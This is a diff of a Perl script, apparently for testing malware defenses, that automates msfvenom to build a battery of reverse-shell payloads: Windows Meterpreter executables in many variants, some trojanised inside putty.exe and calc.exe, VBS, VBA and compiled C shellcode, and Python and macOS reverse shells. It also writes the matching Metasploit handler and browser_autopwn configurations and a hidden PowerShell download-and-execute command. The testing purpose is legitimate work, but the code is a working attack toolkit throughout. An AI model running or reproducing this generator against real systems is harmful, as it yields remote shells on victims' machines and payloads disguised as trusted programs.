@@ -8,16 +8,20 @@ use warnings;
   my($currentFileName, $encoder,$cmd, $OUTFILE);
   my($archiveFolder);
   my($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst);
-  my($scriptNum,$scriptName);
+  my($scriptNum,$scriptName, $batchfile);
+  my($dieMessage);
 
-  $LHOST = shift or die "Expecting an IP address in arg 1";  
-  $LPORT = shift or die "Expecting a TCP Port address in arg 2";  
-  $PROJECT = shift or die "Expecting a Project Name in arg 3"; 
-  $PROJECTNUM = shift or die "Expecting a Project Number in arg 4";
+  $dieMessage = "";
+  $LHOST = shift or $dieMessage .= "Expecting an IP address in arg 1\n";  
+  $LPORT = shift or $dieMessage .=  "Expecting a TCP Port address in arg 2\n";  
+  $PROJECT = shift or $dieMessage .=  "Expecting a Project Name in arg 3\n"; 
+  $PROJECTNUM = shift or $dieMessage .=  "Expecting a Project Number in arg 4\n";
+  if ($dieMessage) {die $dieMessage};
  
   #define the target folder and ensure it exists
   $targetFolder="/opt/malwaredefense/current";
   `mkdir -p $targetFolder`;
+  $batchfile = "$targetFolder/000-ExectuablesBatch.bat";
  
   $fileNdx=0;
   $commandControl = "lhost=$LHOST lport=$LPORT";
@@ -35,13 +39,14 @@ use warnings;
   ##
   ##################
 
-  `touch $targetFolder/000-StartMSF900.cue`;
+#  `touch $targetFolder/000-StartMSF900.cue`;
   $payload = 'windows/meterpreter/reverse_tcp';
   $platform_arch = '--platform win -ax86';
   $encoder = "-e generic/none";
 
-
-  open( $OUTFILE, '>', "$targetFolder/900-reverse_tcp_noenc-32.rc");
+  $scriptNum="000";
+  $batchfile = "$targetFolder/${scriptNum}-ExectuablesBatch.bat";
+  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-reverse_tcp_noenc-32.rc");
 print $OUTFILE <<TCPNOENC;
 use multi/handler
 set payload $payload
@@ -58,18 +63,21 @@ TCPNOENC
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter: $cmd";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="002";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-packed-putty-32.exe";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter packed into putty: $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
   
   $scriptNum ="003";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-32.vbs";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter vbs  (Download and pass as arg to cscript or double click): $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="004";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-32.vba";
@@ -83,6 +91,8 @@ TCPNOENC
   print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter C Shell Code, not encoded: $cmd\n";
   `$cmd`;
   &createShellcodeEXEFromTemplate(333,"$targetFolder/$scriptName");
+  $scriptName =~s/c$/exe/;
+  `echo $scriptName >>$batchfile`;
 
 
 
@@ -104,18 +114,21 @@ TCPNOENC
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter encoded: $cmd";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="012";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-packed-putty-32enc.exe";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter encoded, packed into putty: $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="013";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-32enc.vbs";
    $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
    print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter  encoded vbs(Download and pass as arg to cscript or double click): $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
 
   #tuning encoder down to 1 for VBA
@@ -133,10 +146,13 @@ TCPNOENC
   print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter C Shell Code, encoded: $cmd\n";
   `$cmd`;
   &createShellcodeEXEFromTemplate(360,"$targetFolder/$scriptName");
+  $scriptName =~s/c$/exe/;
+  `echo $scriptName >>$batchfile`;
 
-  `touch $targetFolder/050-${PROJECT}-${PROJECTNUM}-RepeatWith905.cue`;
+  #`touch $targetFolder/050-${PROJECT}-${PROJECTNUM}-RepeatWith905.cue`;
 
- open( $OUTFILE, '>', "$targetFolder/905-reverse_tcp-enc-32.rc");
+${scriptNum}="050";
+ open( $OUTFILE, '>', "$targetFolder/$scriptNum-reverse_tcp-enc-32.rc");
 print $OUTFILE <<TCPENC;
 use multi/handler
 set payload windows/meterpreter/reverse_tcp
@@ -154,12 +170,13 @@ TCPENC
   ##
   ##################
 
-  `touch $targetFolder/060-StartMSF980.cue`;
+  #`touch $targetFolder/060-StartMSF980.cue`;
   $payload = "windows/meterpreter_reverse_tcp";
   $encoder = "";
   $platform_arch = '--platform win -ax86';
-
-  open( $OUTFILE, '>', "$targetFolder/980-stageless-reverse_tcp-enc-32.rc");
+  ${scriptNum} = "060";
+  $batchfile = "$targetFolder/${scriptNum}-ExectuablesBatch.bat";
+  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-stageless-reverse_tcp-enc-32.rc");
 print $OUTFILE <<TCPSTAGELESS32;
 use multi/handler
 set payload $payload
@@ -175,18 +192,21 @@ TCPSTAGELESS32
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bit Stageless Meterpreter, no encoding: $cmd\n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="062";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-packed-putty-32.exe";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bit Stageless Meterpreter packed into putty, no encoding: $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="063";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StaglessMeterpreter-32.vbs";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bit stageless Meterpreter vbs, no encoding  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="064";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32.vba";
@@ -200,6 +220,8 @@ TCPSTAGELESS32
   print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter C Shell Code, not encoded: $cmd\n";
   `$cmd`;
   &createShellcodeEXEFromTemplate(957999,"$targetFolder/$scriptName");
+  $scriptName =~s/c$/exe/;
+  `echo $scriptName >>$batchfile`;
 
   ###################
   ##
@@ -216,18 +238,21 @@ TCPSTAGELESS32
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bit Stageless Meterpreter, encoded: $cmd";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="072";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-packed-putty-32enc.exe";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32bit Stageless Meterpreter packed into putty, encoded: $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="073";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32enc.vbs";
    $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
    print "\n\n*** ${scriptNum}-32bit Stageless Meterpreter vbs, encoded  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
 
   #tuning encoder down to 1 for VBA
@@ -246,6 +271,8 @@ TCPSTAGELESS32
   print "\n\n*** ${scriptNum}-32Bit Stageless Meterpreter C Shell Code, encoded: $cmd\n";
   `$cmd`;
   &createShellcodeEXEFromTemplate(333,"$targetFolder/$scriptName");
+  $scriptName =~s/c$/exe/;
+  `echo $scriptName >>$batchfile`;
 
 
   ###################
@@ -259,10 +286,12 @@ TCPSTAGELESS32
   $payload = 'windows/x64/meterpreter/reverse_tcp';
   $encoder = ''; 
   
-  `touch $targetFolder/100-StartMSF910.cue`;
+  #`touch $targetFolder/100-StartMSF910.cue`;
 
 
-  open( $OUTFILE, '>', "$targetFolder/910-reverse_tcp-noenc-64.rc");
+  ${scriptNum} = "100";
+  $batchfile = "$targetFolder/${scriptNum}-ExectuablesBatch.bat";
+  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-reverse_tcp-noenc-64.rc");
 print $OUTFILE <<TCPNOENC64;
 use multi/handler
 set payload $payload
@@ -279,18 +308,21 @@ TCPNOENC64
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64bit Staged Meterpreter, no encoding: $cmd";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
   
   $scriptNum ="102";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-calc-64.exe";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64bit Staged Meterpreter packed into putty, no encoding: $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="103";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vbs";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64bit Staged Meterpreter vbs, no encoding  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="104";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vba";
@@ -304,6 +336,8 @@ TCPNOENC64
   print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter C Shell Code, encoded: $cmd\n";
   `$cmd`;
   &createShellcodeEXEFromTemplate(510,"$targetFolder/$scriptName");
+  $scriptName =~s/c$/exe/;
+  `echo $scriptName >>$batchfile`;
 
 
   ###################
@@ -322,18 +356,21 @@ TCPNOENC64
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64Bit Staged Meterpreter, encoded: $cmd";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="112";
   $scriptName="112-${PROJECT}-${PROJECTNUM}-StagedPackedMeterpreter-calc-64enc.exe";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64Bit Staged Meterpreter packed into putty, encoded: $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="113";
   $scriptName="113-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-64enc.vbs";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64Bit Staged Meterpreter vbs,encoded  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="114";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-64enc.vba";
@@ -347,11 +384,15 @@ TCPNOENC64
   print "\n\n*** ${scriptNum}-64 Bit Meterpreter C Shell Code, XOR encoded: $cmd\n";
   `$cmd`;
   &createShellcodeEXEFromTemplate(631,"$targetFolder/$scriptName");
+  $scriptName =~s/c$/exe/;
+  `echo $scriptName >>$batchfile`;
 
-  `touch $targetFolder/150-${PROJECT}-${PROJECTNUM}-RepeatWith915.cue`;
+  #`touch $targetFolder/150-${PROJECT}-${PROJECTNUM}-RepeatWith915.cue`;
 
 
-  open( $OUTFILE, '>', "$targetFolder/915-reverse_tcp-enc-64.rc");
+  ${scriptNum} = "150";
+  $batchfile = "$targetFolder/${scriptNum}-ExectuablesBatch.bat";
+  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-reverse_tcp-enc-64.rc");
 print $OUTFILE <<TCPENC64;
 use multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
@@ -376,9 +417,11 @@ TCPENC64
   $payload = 'windows/x64/meterpreter_reverse_tcp';
   $encoder = '';
 
-  `touch $targetFolder/160-StartMSF990.cue`;
+  #`touch $targetFolder/160-StartMSF990.cue`;
+  ${scriptNum} = "160";
 
-  open( $OUTFILE, '>', "$targetFolder/990-stageless-reverse_tcp-enc-64.rc");
+  $batchfile = "$targetFolder/${scriptNum}-ExectuablesBatch.bat";
+  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-stageless-reverse_tcp-enc-64.rc");
 print $OUTFILE <<TCPSTAGELESS64;
 use multi/handler
 set payload windows/x64/meterpreter_reverse_tcp
@@ -394,18 +437,21 @@ TCPSTAGELESS64
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter, no encoding: $cmd";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="162";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-calc-64.exe";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter packed into putty, no encoding: $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="163";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vbs";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter vbs, no encoding  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="164";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vba";
@@ -414,11 +460,12 @@ TCPSTAGELESS64
   `$cmd`;
 
   $scriptNum ="165";
-  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64.c";
+  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64.exe";
   $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/";
   print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter C Shell Code, not encoded: $cmd\n";
   `$cmd`;
   &createShellcodeEXEFromTemplate(1189423,"$targetFolder/$scriptName");
+  `echo $scriptName >>$batchfile`;
 
 
   ###################
@@ -437,18 +484,21 @@ TCPSTAGELESS64
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter, encoded: $cmd";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="172";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-PackedStagelessMeterpreter-calc-64enc.exe";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter packed into win calc, encoded: $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="173";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64enc.vbs";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter vbs, encoded  (Download and pass as arg to cscript): $cmd \n";
   `$cmd`;
+  `echo $scriptName >>$batchfile`;
 
   $scriptNum ="174";
   $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64enc.vba";
@@ -457,11 +507,12 @@ TCPSTAGELESS64
   `$cmd`;
 
   $scriptNum ="175";
-  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64enc.c";
+  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64enc.exe";
   $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter  C Shell Code: $cmd\n";
   `$cmd`;
   &createShellcodeEXEFromTemplate(1189543,"$targetFolder/$scriptName");
+  `echo $scriptName >>$batchfile`;
 
   $payload = 'windows/x64/meterpreter/reverse_tcp';
 
@@ -472,8 +523,9 @@ TCPSTAGELESS64
   ##
   ##################
 
-  `touch $targetFolder/200-${PROJECT}-${PROJECTNUM}-Run950.cue`;
-  open( $OUTFILE, '>', "$targetFolder/950-reversehttps.rc");
+  #`touch $targetFolder/200-${PROJECT}-${PROJECTNUM}-Run950.cue`;
+  $scriptNum="200";
+  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-reversehttps.rc");
 print $OUTFILE <<RHTTPSNOENC;
 use multi/handler
 set payload windows/meterpreter/reverse_https
@@ -500,10 +552,75 @@ RHTTPSNOENC
   `cp $ShellCodePath $targetFolder/$scriptName`;
   `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $targetFolder/$scriptName`;
   $cmd = "powershell.exe -NoP -NonI -w HIDDEN -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST/$scriptName'))";
-  $scriptname = "201_PScommand.txt";
+  $scriptName = "201_PScommand.txt";
   open( $OUTFILE, '>', "$targetFolder/$scriptName");
   print $OUTFILE $cmd;
   close $OUTFILE;
+
+
+ ###################
+  ##
+  ##  Python
+  ##
+  ##################
+ 
+
+  $platform_arch = "--platform Python -a python";
+  $encoder = "-e generic/none";
+  $payload = "python/meterpreter/reverse_tcp";
+  $scriptNum="300";
+ #`touch $targetFolder/${scriptNum}-${PROJECT}-${PROJECTNUM}-run970.cue`;
+  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-pythonreverse_tcp.rc");
+print $OUTFILE <<PYRTCP;
+use multi/handler
+set payload $payload
+set LHOST $LHOST
+set LPORT $LPORT
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
+PYRTCP
+  close $OUTFILE;
+
+
+
+  $scriptNum ="301";
+  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-python.py";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} $encoder > $targetFolder/$scriptName";
+  print "\n\n*** ${scriptNum}-Meterpreter python: $cmd\n";
+  `$cmd`;
+
+
+  ###################
+  ##
+  ##  MAC
+  ##
+  ##################
+
+
+  $platform_arch = "--platform OSX -a x86";
+  $encoder = '-e generic/none -b "\x00"';
+  $payload = "osx/x86/shell_reverse_tcp";
+
+  $scriptNum="400";
+  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-MacShellReverseTCP.rc");
+print $OUTFILE <<MACSHELL1;
+use multi/handler
+set payload $payload
+set LHOST $LHOST
+set LPORT $LPORT
+set ExitOnSession false
+set EnableStageEncoding true
+exploit -j
+MACSHELL1
+  close $OUTFILE;
+
+  $scriptNum ="401";
+  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-shell.macho";
+  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f macho > $targetFolder/$scriptName";
+  print "\n\n*** ${scriptNum}-Meterpreter mac: $cmd\n";
+  `$cmd`;
+
 
 
 
@@ -514,9 +631,8 @@ RHTTPSNOENC
   ##################
 
 
-  `touch $targetFolder/300-${PROJECT}-${PROJECTNUM}-run960.cue`;
-
-  open( $OUTFILE, '>', "$targetFolder/960-browserautopwn1.rc");
+$scriptNum = "900";
+  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-browserautopwn1.rc");
 print $OUTFILE <<BAPENC;
 use auxiliary/server/browser_autopwn
 set SRVHOST $LHOST
@@ -532,9 +648,9 @@ BAPENC
 
 
 
-
-  `touch $targetFolder/300-${PROJECT}-${PROJECTNUM}-run965.cue`;
-  open( $OUTFILE, '>', "$targetFolder/965-browserautopwn2.rc");
+$scriptNum="910";
+#  `touch $targetFolder/300-${PROJECT}-${PROJECTNUM}-run965.cue`;
+  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-browserautopwn2.rc");
 print $OUTFILE <<BAPENC2;
 use auxiliary/server/browser_autopwn2
 set SRVHOST $LHOST
@@ -546,69 +662,7 @@ exploit
 BAPENC2
 
 
-  ###################
-  ##
-  ##  Python
-  ##
-  ##################
  
-
-  $platform_arch = "--platform Python -a python";
-  $encoder = "-e generic/none";
-  $payload = "python/meterpreter/reverse_tcp";
-
- `touch $targetFolder/400-${PROJECT}-${PROJECTNUM}-run970.cue`;
-  open( $OUTFILE, '>', "$targetFolder/970-pythonreverse_tcp.rc");
-print $OUTFILE <<PYRTCP;
-use multi/handler
-set payload $payload
-set LHOST $LHOST
-set LPORT $LPORT
-set ExitOnSession false
-set EnableStageEncoding true
-exploit -j
-PYRTCP
-  close $OUTFILE;
-
-
-
-  $scriptNum ="401";
-  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-python.py";
-  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} $encoder > $targetFolder/$scriptName";
-  print "\n\n*** ${scriptNum}-Meterpreter python: $cmd\n";
-  `$cmd`;
-
-
-
-  ###################
-  ##
-  ##  MAC
-  ##
-  ##################
-
-
-  $platform_arch = "--platform OSX -a x86";
-  $encoder = '-e generic/none -b "\x00"';
-  $payload = "osx/x86/shell_reverse_tcp";
-
- `touch $targetFolder/500-${PROJECT}-${PROJECTNUM}-run975.cue`;
-  open( $OUTFILE, '>', "$targetFolder/975-MacShellReverseTCP.rc");
-print $OUTFILE <<MACSHELL1;
-use multi/handler
-set payload $payload
-set LHOST $LHOST
-set LPORT $LPORT
-set ExitOnSession false
-set EnableStageEncoding true
-exploit -j
-MACSHELL1
-  close $OUTFILE;
-
-  $scriptNum ="501";
-  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-shell.macho";
-  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f macho > $targetFolder/$scriptName";
-  print "\n\n*** ${scriptNum}-Meterpreter mac: $cmd\n";
-  `$cmd`;
 
   ###################
   ##
@@ -633,9 +687,9 @@ MACSHELL1
   ##
   ##################
 
- `touch $targetFolder/600-${PROJECT}-${PROJECTNUM}-AlternateBoot.cue`;
- `touch $targetFolder/601-${PROJECT}-${PROJECTNUM}-USB.cue`;
- `touch $targetFolder/602-${PROJECT}-${PROJECTNUM}-Email.cue`;
+ `touch $targetFolder/920-${PROJECT}-${PROJECTNUM}-AlternateBoot.cue`;
+ `touch $targetFolder/930-${PROJECT}-${PROJECTNUM}-USB.cue`;
+ `touch $targetFolder/940-${PROJECT}-${PROJECTNUM}-Email.cue`;
 
   ###################
   ##
@@ -649,7 +703,8 @@ MACSHELL1
   `cp /opt/eicar/eicar_com.zip /opt/malwaredefense/current/0004-eicar.zip`;
   `cp /opt/eicar/eicarcom2.zip /opt/malwaredefense/current/0005-eicar2.zip`;
   `zip -j -r $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip $targetFolder/*`;
-  `zip -j -r $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBatteryEncrypted.zip $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip -e `;
+  print "enter 123 for the password\n\n";
+  `zip -j -r $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBatteryEnc-pw123.zip $targetFolder/999-$PROJECT-$PROJECTNUM-Malware-CurrentBattery.zip -e `;
 
 
 
@@ -658,6 +713,7 @@ MACSHELL1
 
 sub createShellcodeEXEFromTemplate{
   my($venomFile, $VENOM, $codeSize, $outCFile, $outEXEFile, $OUTPUT);
+  my($compiler);
   $codeSize = shift;
   $venomFile = shift;
   $outEXEFile = $venomFile;
@@ -689,14 +745,14 @@ return(0);
 }
 SHELL_CODE_TEMPLATE_END
   close($OUTPUT);
-  $outEXEFile = $outCFile;
-  $outEXEFile =~ s/c$/exe/;
   $_=$outEXEFile;
   if (/64/){
-    `x86_64-w64-mingw32-gcc $outCFile -o $outEXEFile`;
+    $compiler ="x86_64-w64-mingw32-gcc";
   }else{
-    `i686-w64-mingw32-gcc $outCFile  -o $outEXEFile`;
+    $compiler ="i686-w64-mingw32-gcc";
   }
+  `$compiler $outCFile  -o $outEXEFile`;
+
   print "Completed gerneration of $outEXEFile\n";
 }
 
